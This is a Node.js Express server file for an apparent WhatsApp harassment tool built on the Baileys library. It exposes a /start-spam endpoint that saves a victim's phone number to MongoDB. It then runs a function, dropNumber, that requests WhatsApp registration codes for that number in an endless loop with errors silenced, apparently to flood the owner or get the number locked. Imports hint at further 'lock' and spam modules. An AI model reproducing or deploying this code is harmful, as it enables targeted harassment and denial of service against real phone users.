require('dotenv').config(); 
var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var { default: makeWaSocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers  } = require('@whiskeysockets/baileys');
var ejs = require('ejs');
var pino = require('pino');
var mongoose = require('mongoose');
var { startSpamV2, sendStoredData, startPairingCodeGeneration, sendStoredDataV2, SpamData, PairDataa} = require('./server3.js');
code2 = require('./start-pairing/pair2');
var indexRouter = require('./routes/index');
var lockRouter = require('./routes/lock.js');
var pair2Router = require('./routes/pair2.js');

var app = express();

 // MongoDB connection string from environment variable
 const mongoURI = process.env.MONGODB_URI;

 // Connect to MongoDB
 mongoose.connect(mongoURI)
     .then(() => console.log('Connected to MongoDB1'))
     .catch(err => console.log('Error connecting to MongoDB:', err));

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'jade');
    app.set('view engine', 'ejs');
    app.engine('ejs', ejs.renderFile);

app.use('/code2', code2);
app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', indexRouter);
app.use('/lock', lockRouter);
app.use('/pair2', pair2Router);


app.post('/start-spam', async (req, res) => {
  const { ddi, number } = req.body;
   console.log(req.body)
  try {
      // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
      const existingData = await SpamData.findOne({ ddi, number });
      if (existingData) {
          console.log('Ist schon vorhanden');
          // Optional: Handle case where data already exists
      } else {
          // Neue Instanz des Modells erstellen und speichern
          const newData = new SpamData({ ddi, number });
          await newData.save();
          console.log(`Data saved successfully ${ ddi, number }`);
      }

      const { state, saveCreds } = await useMultiFileAuthState('session')
      const spam = makeWaSocket({
          auth: state,
          mobile: true,
          logger: pino({ level: 'silent' })
      });
      const phoneNumber = ddi + number;
      await dropNumber(spam, phoneNumber, ddi, number);

      // Erfolgreiche Antwort an den Client senden
      res.status(200).json({ message: 'Spam started successfully' });
  } catch (error) {
      console.log(error);
      if (error.code === 'SomeSpecificErrorCode') {
          res.status(400).json({ error: 'Bad request' }); // Send specific error response for a certain error code
      } else {
          res.status(500).json({ error: 'Internal server error' }); // Send generic error response for other errors
      }
  }
});


async function dropNumber(spam, phoneNumber, ddi, number) {
  while (true) {
      try {
          const res = await spam.requestRegistrationCode({
              phoneNumber: '+' + phoneNumber,
              phoneNumberCountryCode: ddi,
              phoneNumberNationalNumber: number,
              phoneNumberMobileCountryCode: 666,
          });
          
      } catch (error) {
         
      }
  }
}

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

startSpamV2();



module.exports = app;
